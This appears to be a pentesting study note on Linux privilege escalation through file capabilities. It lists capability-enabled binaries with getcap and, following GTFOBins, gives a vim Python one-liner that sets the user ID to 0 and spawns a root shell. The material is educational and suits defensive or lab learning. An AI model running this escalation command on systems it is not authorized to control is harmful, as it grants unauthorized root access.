# Capabilities

System administrators can use "Capabilities" to manage privileges at a granular level for processes or binaries. For instance, if a SOC analyst needs to initiate socket connections, which a regular user cannot do, the administrator can modify the binary's capabilities instead of granting higher privileges. This allows the binary to perform its task without requiring elevated user rights.

We can use the `getcap` tool to list enabled capabilities, but it's good practice to use this command to redirect the error messages to /dev/null:

```bash
getcap -r / 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

We can see that both `vim` and `view` have the Capabilities set, but as we can see from the image below neither has the SUID bit set.

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can lookup on [GTFObins](https://gtfobins.github.io/) for a binary that helps us to leverage privilege escalation.

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use the command with `py`, or `py3` accordingly:

{% code overflow="wrap" %}
```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

And we successfully leverage our permissions!
